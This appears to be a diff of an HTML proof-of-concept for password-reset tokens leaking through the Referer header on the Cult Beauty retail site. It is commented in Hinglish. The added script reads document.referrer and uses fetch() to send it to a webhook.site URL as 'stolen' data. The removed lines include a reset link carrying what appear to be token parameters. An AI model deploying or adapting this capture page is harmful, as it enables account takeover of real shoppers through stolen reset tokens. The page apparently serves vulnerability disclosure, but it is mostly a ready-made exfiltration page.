@@ -1,22 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Cult Beauty Token Leakage Test</title>
+    <title>Hacker's Landing Page</title>
 </head>
 <body>
-    <h1>Token Leakage PoC</h1>
-    <p>Is button par click karne se aap Cult Beauty ke sensitive page par jayenge.</p>
+    <h1 style="color:red;">Hacker's Server - Token Capture</h1>
+    <p>Agar aap yahan Cult Beauty se aaye hain, to aapka token leak ho chuka hai!</p>
     
-    <a href="https://www.cultbeauty.co.uk/account/reset-password?ecrmcid=Vq8bl1n6YxpmrVnNa96xrP4BWZ57Oa90&shae=NmCjaucYYsUU8C2DVQxKiKVjba%2BLmHgAus%2BbCXJHTig%3D&action=reset">
-        1. Go to Sensitive Page
-    </a>
-
-    <br><br>
-
-    <p>Ab us page par mojood kisi bhi external link (Social Media/Footer) par click karein jo niche diye gaye webhook par redirect kare.</p>
-    
-    <a href="https://webhook.site/9df24ac2-7482-487b-91fc-e34ebbdbe422">
-        2. Simulated External Link (Capture Token)
-    </a>
+    <script>
+        // Ye script Referer header ko check karegi aur screen par dikhayegi
+        const leakedURL = document.referrer;
+        if (leakedURL) {
+            document.write("<h3>Captured Leaked URL:</h3>");
+            document.write("<code style='background:#eee; padding:10px;'>" + leakedURL + "</code>");
+            
+            // Ye line hacker ke webhook par data bhej degi
+            fetch("https://webhook.site/9df24ac2-7482-487b-91fc-e34ebbdbe422?stolen=" + encodeURIComponent(leakedURL));
+        } else {
+            document.write("<p>No Referer found. Please click from the Cult Beauty Reset Page.</p>");
+        }
+    </script>
 </body>
 </html>
